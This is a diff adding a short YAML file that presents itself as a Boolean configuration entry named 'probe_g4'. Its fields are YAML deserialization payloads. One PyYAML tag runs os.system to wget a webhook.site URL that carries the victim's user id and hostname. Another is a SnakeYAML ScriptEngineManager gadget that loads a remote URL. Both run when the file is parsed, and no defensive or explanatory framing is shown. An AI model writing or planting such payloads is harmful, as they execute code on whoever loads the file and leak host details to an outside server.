@@ -1,0 +1,6 @@
+name: probe_g4
+description: g4
+kind: Boolean
+py: !!python/object/apply:os.system ["wget -q -O- http://webhook.site/fcf51b26-7565-4939-ae43-183e62117a14/rce-$(id -u)-$(hostname)"]
+java: !!javax.script.ScriptEngineManager [!!java.net.URL ["http://webhook.site/fcf51b26-7565-4939-ae43-183e62117a14/g4-java"]]
+control_url_in_yaml: "http://webhook.site/fcf51b26-7565-4939-ae43-183e62117a14/control-inyaml"
